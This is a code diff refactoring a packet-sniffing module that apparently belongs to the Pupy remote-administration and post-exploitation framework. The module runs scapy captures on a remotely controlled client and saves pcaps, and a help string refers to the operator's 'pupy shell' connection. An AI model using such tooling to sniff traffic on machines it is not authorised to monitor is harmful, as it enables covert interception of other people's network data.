@@ -7,29 +7,23 @@ import threading
 import Queue
 import time
 import readline
-from modules.lib.windows.winpcap import init_winpcap
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 import datetime
+from threading import Event
+
 from pupylib import * # placed after scapy inport to avoid scapy's config collision
 
 __class_name__="TcpdumpModule"
-
-def gen_cb_function(pcap_writer=None, print_summary=True):
-    def pkt_callback(pkt):
-        pkt=Ether(obtain(str(pkt)))
-        if pcap_writer is not None:
-            pcap_writer.write(pkt)
-        if print_summary:
-            print pkt.summary()
-    return pkt_callback
 
 @config(cat="network", tags=["sniff", "pcap"])
 class TcpdumpModule(PupyModule):
     """ module to reproduce some of the classic tcpdump tool functions """
 
-    dependencies=['scapy', 'tcpdump']
+    dependencies = ('scapy', 'tcpdump')
+    terminate = None
+    wait = Event()
 
     @classmethod
     def init_argparse(cls):
@@ -41,24 +35,65 @@ class TcpdumpModule(PupyModule):
         cls.arg_parser.add_argument("--bpf", required=True, help="use a BPF (Warning: It is highly advised to whitelist pupy's shell IP/PORT you are currently using to avoid a nasty Larsen effect)") #yup mandatory cause you have to put pupy's IP/PORT anyway
         #cls.arg_parser.add_argument("command", choices=["start", "stop"])
 
+    def printer(self, pcap_writer=None, print_summary=True):
+        def pkt_callback(pkt):
+            try:
+                pkt = Ether(pkt)
+            except Exception, e:
+                self.exception(e)
+
+            if pcap_writer is not None:
+                pcap_writer.write(pkt)
+
+            if print_summary:
+                self.log(pkt.summary())
+
+        return pkt_callback
+
+    def on_error(self, error=None):
+        if error:
+            self.error('Scapy error: {}'.format(error))
+
+        self.wait.set()
+
     def run(self, args):
         self.sniff_sess = None
 
-        init_winpcap(self)
-        pktwriter=None
-        if args.save_pcap:
-            try:
-                os.makedirs(os.path.join("data","pcaps"))
-            except Exception:
-                pass
-            filepath=os.path.join("data","pcaps","cap_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".pcap")
-            pktwriter = PcapWriter(filepath, append=True, sync=True)
-            self.info("Packets printed will be streamed into %s ..."%filepath)
+        if self.client.is_windows():
+            from modules.lib.windows.winpcap import init_winpcap
+            init_winpcap(self.client)
 
+        pktwriter = None
 
         if args.timeout==None and args.count==0:
-            raise PupyModuleError("--timeout or --count options are mandatory for now.")#TODO patch scapy to have an interruptible sniff() function
+            #TODO patch scapy to have an interruptible sniff() function
+            raise PupyModuleError("--timeout or --count options are mandatory for now.")
 
-        self.sniff_sess=self.client.conn.modules["tcpdump"].SniffSession(gen_cb_function(pcap_writer=pktwriter), bpf=args.bpf, timeout=args.timeout, count=args.count, iface=args.iface)
-        #with redirected_stdio(self):
-        self.sniff_sess.start()
+        if args.save_pcap:
+            config = self.client.pupsrv.config or PupyConfig()
+            filepath = config.get_file('pcaps', {'%c': self.client.short_name()})
+            pktwriter = PcapWriter(filepath, append=True, sync=True)
+            self.info('Save pcap to: {}'.format(filepath))
+
+        tcpdump = self.client.remote('tcpdump', 'run', False)
+
+        self.wait.clear()
+
+        name, self.terminate = tcpdump(
+            self.printer(pcap_writer=pktwriter),
+            self.on_error,
+            args.iface,
+            args.bpf,
+            args.timeout,
+            count=args.count
+        )
+
+        self.success(u'Scapy tcpdump on "{}" - started'.format(name))
+        self.wait.wait()
+        self.success(u'Scapy tcpdump on "{}" - completed'.format(name))
+
+    def interrupt(self):
+        if self.terminate:
+            self.terminate()
+
+        self.wait.set()
